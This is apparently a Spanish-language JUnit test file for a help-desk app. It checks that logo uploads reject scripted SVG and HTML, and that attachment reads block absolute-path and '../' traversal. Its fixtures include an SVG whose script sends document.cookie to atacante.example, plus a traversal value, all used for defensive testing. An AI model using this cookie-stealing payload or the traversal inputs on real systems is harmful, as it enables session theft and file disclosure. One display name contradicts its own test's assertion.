package com.mesaayuda.service;

import com.mesaayuda.entity.Attach;
import com.mesaayuda.entity.BrandingConfig;
import com.mesaayuda.exception.BadRequestException;
import com.mesaayuda.config.UploadZones;
import com.mesaayuda.repository.BrandingConfigRepository;
import com.mesaayuda.repository.TicketRepository;
import com.mesaayuda.repository.UserRepository;
import com.mesaayuda.security.UrlSafetyValidator;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.ArgumentCaptor;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.core.io.Resource;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.test.util.ReflectionTestUtils;
import org.springframework.web.multipart.MultipartFile;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;
import java.util.Optional;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.Mockito.lenient;
import static org.mockito.Mockito.when;

/**
 * Carga de archivos en la zona publica y lectura de adjuntos.
 *
 * <p>Los dos caminos tienen el mismo problema de fondo: un archivo cuyo nombre o
 * rutaeligidos decide donde acaba y que se sirve. Y los dos estan expuestos:
 *
 * <ul>
 *   <li>La zona publica se sirve SIN SESION porque el logo se ve en la pantalla de
 *       acceso, y en produccion comparte origen con la aplicacion. Ahi un SVG
 *       con script se ejecuta en el dominio de la SPA, que guarda el token de
 *       sesion. Ya habia SVG subidos antes de que existiera la validacion.
 *   <li>El fallback de compatibilidad de los adjuntos aceptaba una ruta absoluta
 *       guardada en la base sin comprobar contencion, lo que servia cualquier
 *       archivo del disco con los permisos del proceso.
 * </ul>
 */
@ExtendWith(MockitoExtension.class)
class CargaDeArchivosSeguraTest {

    /** PNG de 1x1: cabecera de firma valida. */
    private static final byte[] PNG = new byte[] {
            (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
            0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
            0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
            0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, (byte) 0xC4,
            (byte) 0x89, 0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41,
            0x54, 0x78, (byte) 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00,
            0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, (byte) 0xB4, 0x00,
            0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, (byte) 0xAE,
            0x42, 0x60, (byte) 0x82
    };

    /** SVG con script, que es el ataque que se quiere cerrar. */
    private static final byte[] SVG_MALICIOSO = ("<svg xmlns=\"http://www.w3.org/2000/svg\">"
            + "<script>fetch('https://atacante.example/?c='+document.cookie)</script>"
            + "</svg>").getBytes(java.nio.charset.StandardCharsets.UTF_8);

    @Mock private BrandingConfigRepository brandingConfigRepository;
    @Mock private UrlSafetyValidator urlSafetyValidator;
    @Mock private TicketRepository ticketRepository;
    @Mock private UserRepository userRepository;
    /** Lo necesita la politica de acceso que inyecta el TicketService. */
    @Mock private UserService userService;

    @InjectMocks private AdminService adminService;
    @InjectMocks private TicketService ticketService;

    private Path raizUploads;
    private BrandingConfig branding;

    @BeforeEach
    void setUp() throws Exception {
        raizUploads = Files.createTempDirectory("uploads-seguras");
        ReflectionTestUtils.setField(adminService, "uploadDir", raizUploads.toString());
        ReflectionTestUtils.setField(ticketService, "uploadDir", raizUploads.toString());
        ReflectionTestUtils.setField(ticketService, "accessPolicy", politicaReal());
        branding = new BrandingConfig();
        lenient().when(brandingConfigRepository.findTopByOrderByIdBrandingAsc())
                .thenReturn(Optional.of(branding));
        lenient().when(brandingConfigRepository.save(org.mockito.ArgumentMatchers.any()))
                .thenAnswer(inv -> inv.getArgument(0));
    }

private TicketAccessPolicy politicaReal() {
          TicketAccessPolicy politica = new TicketAccessPolicy();
          ReflectionTestUtils.setField(politica, "userService", userServiceMock());
          return politica;
      }

      private UserService userServiceMock() {
          return userService;
      }

    private MultipartFile archivo(String nombre, byte[] contenido) {
        return new MockMultipartFile("file", nombre, "application/octet-stream", contenido);
    }

    // ============================ ZONA PUBLICA ============================

    @Test
    @DisplayName("un SVG con script no se guarda en la zona publica")
    void svgConScriptSeRechaza() {
        BadRequestException e = assertThrows(BadRequestException.class,
                () -> adminService.saveLogo(archivo("logo.svg", SVG_MALICIOSO)));

        assertTrue(e.getMessage().contains("no es una imagen valida")
                        || e.getMessage().contains("no es una imagen válida"),
                "el mensaje deberia explicar que no es una imagen: " + e.getMessage());
        assertNull(branding.getLogoUrl(), "no se guarda la referencia aunque se rechace");
    }

    @Test
    @DisplayName("un HTML disfrazado de imagen tampoco se guarda")
    void htmlDisfrazadoSeRechaza() {
        byte[] html = "<html><script>alert(1)</script></html>"
                .getBytes(java.nio.charset.StandardCharsets.UTF_8);

        assertThrows(BadRequestException.class,
                () -> adminService.saveLogo(archivo("logo.html", html)));
    }

    @Test
    @DisplayName("un PNG con nombre deceptive si se guarda")
    void pngSiSeGuarda() throws Exception {
        Map<String, String> res = adminService.saveLogo(archivo("cualquier-cosa.png", PNG));

        assertTrue(res.get("url").startsWith("/uploads/publico/logo_"));
        assertTrue(res.get("url").endsWith(".png"));
        assertNotNull(Files.readAllBytes(raizUploads.resolve(
                UploadZones.PUBLICO).resolve(res.get("url").substring("/uploads/publico/".length()))));
    }

    @Test
    @DisplayName("la extension guardada la decide el contenido y no el nombre enviado")
    void laExtensionLaDecideElContenido() throws Exception {
        // Se sube un JPEG con nombre .png: el archivo debe guardarse como .jpeg,
        // porque es lo que el navegador interpretara al recibirlo.
        byte[] jpeg = new byte[] {(byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0, 0, 0, 0, 0, 0, 0, 0};

        Map<String, String> res = adminService.saveLogo(archivo("logo.png", jpeg));

        assertTrue(res.get("url").endsWith(".jpg"),
                "la extension no debe venir del nombre: " + res.get("url"));
    }

    @Test
    @DisplayName("un archivo vacio se rechaza antes de mirar su contenido")
    void archivoVacioSeRechaza() {
        assertThrows(BadRequestException.class,
                () -> adminService.saveLogo(archivo("logo.png", new byte[0])));
    }

    // ============================ ADJUNTOS ============================

    @Test
    @DisplayName("un adjunto se abre desde la zona de adjuntos")
    void adjuntoSeAbreDesdeSuZona() throws Exception {
        Path zona = raizUploads.resolve(UploadZones.ADJUNTOS);
        Files.createDirectories(zona);
        Files.write(zona.resolve("guia.txt"), "contenido".getBytes());
        Attach adj = new Attach();
        adj.setStoragePathAttach("guia.txt");

        Resource r = ticketService.abrirAdjunto(adj);

        assertNotNull(r);
    }

    @Test
    @DisplayName("un storage_path con ruta absoluta fuera de las subidas NO lo sirve")
    void rutaAbsolutaFueraDeSubidasSeRechaza() {
        // Es el hallazgo: el fallback de compatibilidad para registros antiguos
        // resolvia la ruta absoluta sin comprobar contencion, de modo que un
        // registro manipulado servia cualquier archivo del disco.
        Attach adj = new Attach();
        adj.setStoragePathAttach(raizUploads.getParent().toString() + "/otro.txt");

        assertNull(ticketService.abrirAdjunto(adj),
                "una ruta fuera de la raiz de subidas debe quedar sin servir");
    }

    @Test
    @DisplayName("tampoco sirve una ruta absoluta que si esta dentro de la raiz")
    void rutaAbsolutaDentroDeLaRaizSiSeSirve() throws Exception {
        // El caso legitimo del fallback: un adjunto historico guardado con su
        // ruta completa antes de que existiera la zona. Se sigue permitiendo,
        // pero solo si cae dentro de la raiz de subidas.
        Path dentro = raizUploads.resolve("historico.txt");
        Files.write(dentro, "viejo".getBytes());
        Attach adj = new Attach();
        adj.setStoragePathAttach(dentro.toString());

        assertNotNull(ticketService.abrirAdjunto(adj));
    }

    @Test
    @DisplayName("un recorrido con .. no sale de la zona de adjuntos")
    void noSeSaleDeLaZonaConPuntos() throws Exception {
        Path zona = raizUploads.resolve(UploadZones.ADJUNTOS);
        Files.createDirectories(zona);
        Files.write(raizUploads.resolve("secreto.txt"), "no deberia servirse"
                .getBytes(java.nio.charset.StandardCharsets.UTF_8));

        Attach adj = new Attach();
        adj.setStoragePathAttach("../secreto.txt");

        assertNull(ticketService.abrirAdjunto(adj));
    }
}